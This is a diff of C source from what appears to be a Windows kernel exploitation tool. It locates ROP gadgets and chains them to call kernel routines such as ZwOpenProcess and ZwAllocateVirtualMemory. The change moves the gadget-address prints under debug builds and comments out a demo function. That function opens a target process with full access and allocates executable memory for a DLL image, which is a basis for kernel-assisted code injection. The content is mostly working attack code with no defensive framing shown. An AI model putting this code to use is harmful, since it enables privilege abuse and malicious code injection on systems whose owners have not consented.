@@ -270,16 +270,26 @@ BOOL RopInit(ULONG64 allocatePool)
 			g_RopAddr_1 = (PVOID)allocatePool;
 	}
 
-	
-
 	if (g_RopAddr_1 == NULL || g_RopAddr_2 == NULL || g_RopAddr_3 == NULL || g_RopAddr_4 == NULL || g_RopAddr_5 == NULL)
+	{
+#ifdef _DEBUG
+		printf("find rop gadget error\n");
+		printf("ROP gadget #1 is at 0x%p\n", g_RopAddr_1);
+		printf("ROP gadget #2 is at 0x%p\n", g_RopAddr_2);
+		printf("ROP gadget #3 is at 0x%p\n", g_RopAddr_3);
+		printf("ROP gadget #4 is at 0x%p\n", g_RopAddr_4);
+		printf("ROP gadget #5 is at 0x%p\n", g_RopAddr_5);
+#endif
 		goto _end;
-
-	//printf("ROP gadget #1 is at 0x%llX\n", g_RopAddr_1);
-	//printf("ROP gadget #2 is at 0x%llX\n", g_RopAddr_2);
-	//printf("ROP gadget #3 is at 0x%llX\n", g_RopAddr_3);
-	//printf("ROP gadget #4 is at 0x%llX\n", g_RopAddr_4);
-	//printf("ROP gadget #5 is at 0x%llX\n", g_RopAddr_5);
+	}
+		
+#ifdef _DEBUG
+	printf("ROP gadget #1 is at 0x%p\n", g_RopAddr_1);
+	printf("ROP gadget #2 is at 0x%p\n", g_RopAddr_2);
+	printf("ROP gadget #3 is at 0x%p\n", g_RopAddr_3);
+	printf("ROP gadget #4 is at 0x%p\n", g_RopAddr_4);
+	printf("ROP gadget #5 is at 0x%p\n", g_RopAddr_5);
+#endif
 
 	/*
 		Get address of nt!ZwTerminateThread(), we need this function
@@ -650,52 +660,52 @@ BOOL RopCall(char* lpszProcName, PVOID* Args, DWORD dwArgsCount, PVOID* pRetVal)
 	return RopCallAddr(FuncAddr, Args, dwArgsCount, pRetVal);
 }
 
-void RopDemo(HANDLE pid)
-{
-	CLIENT_ID ClientId;
-	OBJECT_ATTRIBUTES ObjAttr;
-	DWORD_PTR Status;
-	InitializeObjectAttributes(&ObjAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
-
-	ClientId.UniqueProcess = pid;
-	ClientId.UniqueThread = NULL;
-	HANDLE hProcess = NULL;
-	PVOID Args_1[] = { KF_ARG(&hProcess),                   // ProcessHandle
-					   KF_ARG(PROCESS_ALL_ACCESS),          // DesiredAccess
-					   KF_ARG(&ObjAttr),                    // ObjectAttributes
-					   KF_ARG(&ClientId) };                 // ClientId
-
-	// open the target process
-	if (!RopCall((char*)"ZwOpenProcess", Args_1, 4, KF_RET(&Status)))
-	{
-		printf("ERROR: KfCall() fails\n");
-	}
-	printf("hProcess %llx,Status %x \n", hProcess, Status);
-
-	PVOID ImageAddr = NULL;
-	SIZE_T dwImageSize = 0x1000;
-	PVOID Args_2[] = { KF_ARG(hProcess),                    // ProcessHandle    
-			   KF_ARG(&ImageAddr),                  // BaseAddress
-			   KF_ARG(0),                           // ZeroBits
-			   KF_ARG(&dwImageSize),                  // RegionSize
-			   KF_ARG(MEM_COMMIT | MEM_RESERVE),    // AllocationType
-			   KF_ARG(PAGE_EXECUTE_READWRITE) };    // Protect
-
-	// allocate memory for the DLL image
-	if (!RopCall((char*)"ZwAllocateVirtualMemory", Args_2, 6, KF_RET(&Status)))
-	{
-		printf("ERROR: KfCall() fails\n");
-	}
-	printf("ImageAddr %llx  Status %x\n", ImageAddr, Status);
-
-
-	PVOID Args[] = { KF_ARG(hProcess) };
-
-	// close target process handle
-	if (!RopCall((char*)"ZwClose", Args, 1, KF_RET(&Status)))
-	{
-		printf("ZwClose() ERROR 0x%.8x\n", Status);
-	}
-	printf("Status %x\n", Status);
-
-}
+//void RopDemo(HANDLE pid)
+//{
+//	CLIENT_ID ClientId;
+//	OBJECT_ATTRIBUTES ObjAttr;
+//	DWORD_PTR Status;
+//	InitializeObjectAttributes(&ObjAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);
+//
+//	ClientId.UniqueProcess = pid;
+//	ClientId.UniqueThread = NULL;
+//	HANDLE hProcess = NULL;
+//	PVOID Args_1[] = { KF_ARG(&hProcess),                   // ProcessHandle
+//					   KF_ARG(PROCESS_ALL_ACCESS),          // DesiredAccess
+//					   KF_ARG(&ObjAttr),                    // ObjectAttributes
+//					   KF_ARG(&ClientId) };                 // ClientId
+//
+//	// open the target process
+//	if (!RopCall((char*)"ZwOpenProcess", Args_1, 4, KF_RET(&Status)))
+//	{
+//		printf("ERROR: KfCall() fails\n");
+//	}
+//	printf("hProcess %llx,Status %x \n", hProcess, Status);
+//
+//	PVOID ImageAddr = NULL;
+//	SIZE_T dwImageSize = 0x1000;
+//	PVOID Args_2[] = { KF_ARG(hProcess),                    // ProcessHandle    
+//			   KF_ARG(&ImageAddr),                  // BaseAddress
+//			   KF_ARG(0),                           // ZeroBits
+//			   KF_ARG(&dwImageSize),                  // RegionSize
+//			   KF_ARG(MEM_COMMIT | MEM_RESERVE),    // AllocationType
+//			   KF_ARG(PAGE_EXECUTE_READWRITE) };    // Protect
+//
+//	// allocate memory for the DLL image
+//	if (!RopCall((char*)"ZwAllocateVirtualMemory", Args_2, 6, KF_RET(&Status)))
+//	{
+//		printf("ERROR: KfCall() fails\n");
+//	}
+//	printf("ImageAddr %llx  Status %x\n", ImageAddr, Status);
+//
+//
+//	PVOID Args[] = { KF_ARG(hProcess) };
+//
+//	// close target process handle
+//	if (!RopCall((char*)"ZwClose", Args, 1, KF_RET(&Status)))
+//	{
+//		printf("ZwClose() ERROR 0x%.8x\n", Status);
+//	}
+//	printf("Status %x\n", Status);
+//
+//}
